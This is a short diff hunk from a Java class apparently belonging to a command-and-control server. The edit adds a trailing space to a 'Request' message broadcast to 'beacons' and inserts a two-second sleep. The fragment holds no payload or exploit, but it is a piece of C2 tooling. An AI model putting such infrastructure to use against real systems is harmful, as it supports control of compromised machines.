@@ -259,7 +259,12 @@ public class C2ServerUserHandler implements Runnable{
                 e.printStackTrace();
             }
             
-            C2server.broadcastToBeacons("Request " + cilentIP + "_");
+            C2server.broadcastToBeacons("Request " + cilentIP + "_ ");
+            try{
+                Thread.sleep(2000);
+            } catch(InterruptedException e){
+                e.printStackTrace();
+            }
 
             String currentMessage;
             boolean foundCorrectClient = false;
